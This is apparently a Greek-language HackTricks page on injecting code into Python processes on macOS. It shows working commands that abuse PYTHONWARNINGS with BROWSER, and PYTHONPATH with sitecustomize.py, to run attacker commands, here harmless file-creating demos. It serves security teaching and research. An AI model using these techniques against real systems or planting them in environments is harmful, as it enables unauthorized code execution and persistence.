# Injection σε Python Application στο macOS

{{#include ../../../banners/hacktricks-training.md}}

## Μέσω των environment variables `PYTHONWARNINGS` και `BROWSER`

Εάν ένας attacker μπορεί να ελέγξει το environment ενός Python process, ο συνδυασμός των `PYTHONWARNINGS` και `BROWSER` μπορεί να προκαλέσει command execution όταν η Python κάνει import το module `antigravity` κατά την επεξεργασία ενός crafted warning option. Η τεχνική βασίζεται στο ότι το `antigravity` ανοίγει ένα URL με το module `webbrowser` της Python, το οποίο λαμβάνει υπόψη το environment variable `BROWSER`.<sup>[[1]](#references)</sup>
```bash
# Generate an example Python script.
echo "print('hi')" > /tmp/script.py

# Create /tmp/hacktricks through the inherited environment.
PYTHONWARNINGS="all:0:antigravity.x:0:0" BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 /tmp/script.py

# With isolated mode, inject the warning rule using -W instead.
BROWSER="/bin/sh -c 'touch /tmp/hacktricks' #%s" python3 -I -W all:0:antigravity.x:0:0 /tmp/script.py
```
## Μέσω των `PYTHONPATH` και `sitecustomize.py`

Κατά την κανονική εκκίνηση, το module `site` της Python προσθέτει paths ειδικά για το site και στη συνέχεια επιχειρεί να κάνει import ενός module με όνομα `sitecustomize`. Τοποθετώντας έναν κατάλογο στον οποίο έχει πρόσβαση ο attacker πρώτο στο `PYTHONPATH`, ένας attacker που ελέγχει το περιβάλλον της διεργασίας μπορεί να κάνει την Python να κάνει import ενός payload πριν από το target script. Το flag `-S` απενεργοποιεί την αυτόματη αρχικοποίηση του `site`, ενώ το isolated mode (`-I`) αγνοεί το `PYTHONPATH` και συνεπάγεται τα `-s` και `-E`.<sup>[[2]](#references)[[3]](#references)</sup>
```bash
mkdir -p /tmp/python-startup
cat >/tmp/python-startup/sitecustomize.py <<'EOF'
from pathlib import Path
Path('/tmp/python-sitecustomize-executed').touch()
EOF

PYTHONPATH=/tmp/python-startup python3 /tmp/script.py
```
## References

- [1] [Hacking με Environment Variables - elttam](https://www.elttam.com/blog/env/)
- [2] [site — Hook ρυθμίσεων για συγκεκριμένα sites](https://docs.python.org/3/library/site.html)
- [3] [Γραμμή εντολών και environment της Python](https://docs.python.org/3/using/cmdline.html)
{{#include ../../../banners/hacktricks-training.md}}
